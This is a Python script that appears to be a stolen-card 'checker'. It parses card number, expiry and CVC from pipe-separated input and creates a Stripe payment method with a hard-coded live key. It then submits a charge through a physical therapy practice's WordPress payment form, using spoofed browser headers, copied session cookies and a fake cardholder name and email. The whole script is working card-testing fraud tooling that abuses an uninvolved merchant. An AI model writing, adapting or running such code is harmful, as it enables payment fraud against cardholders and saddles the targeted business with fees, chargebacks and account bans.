import requests,re
import random
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 4)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 14; Infinix X6833B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=Sakura&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	cookies = {
	    '_gcl_au': '1.1.247097731.1767012216',
	    '_ga': 'GA1.2.1950506850.1767012217',
	    'fpestid': '-14Kb8ueoAXjjJ7jqlGafsaYmrH1lZgMDHfxt3f9MhNuZVNdp7Xl_BuvBdMxnL31wpLWpw',
	    '_fbp': 'fb.1.1767012220236.271540386480318242',
	    '__stripe_mid': 'bf8f3f67-7415-42b5-ba95-7ae4c3b7d3c45c98d7',
	    'ouibounceBannerBottomShownNumberOfTimes-9285': '0',
	    '_gid': 'GA1.2.1843881722.1767238467',
	    '__stripe_sid': '89a6490a-9cd5-44a1-8bd9-19ad71c9154a66f5f9',
	    '_gat_gtag_UA_184281935_1': '1',
	}
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': '_gcl_au=1.1.247097731.1767012216; _ga=GA1.2.1950506850.1767012217; fpestid=-14Kb8ueoAXjjJ7jqlGafsaYmrH1lZgMDHfxt3f9MhNuZVNdp7Xl_BuvBdMxnL31wpLWpw; _fbp=fb.1.1767012220236.271540386480318242; __stripe_mid=bf8f3f67-7415-42b5-ba95-7ae4c3b7d3c45c98d7; ouibounceBannerBottomShownNumberOfTimes-9285=0; _gid=GA1.2.1843881722.1767238467; __stripe_sid=89a6490a-9cd5-44a1-8bd9-19ad71c9154a66f5f9; _gat_gtag_UA_184281935_1=1',
	    'Origin': 'https://farmingdalephysicaltherapywest.com',
	    'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 14; Infinix X6833B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_payment_charge',
	    'wpfs-form-name': 'Payment-Form',
	    'wpfs-form-get-parameters': '%7B%7D',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-custom-input[]': '1',
	    'wpfs-card-holder-email': 'zerocarder703@gmail.com',
	    'wpfs-card-holder-name': 'Sakura',
	    'wpfs-stripe-payment-method-id': f'{pm}',
	}
	
	response = requests.post(
	    'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	result = response.json()['message']
	
	return result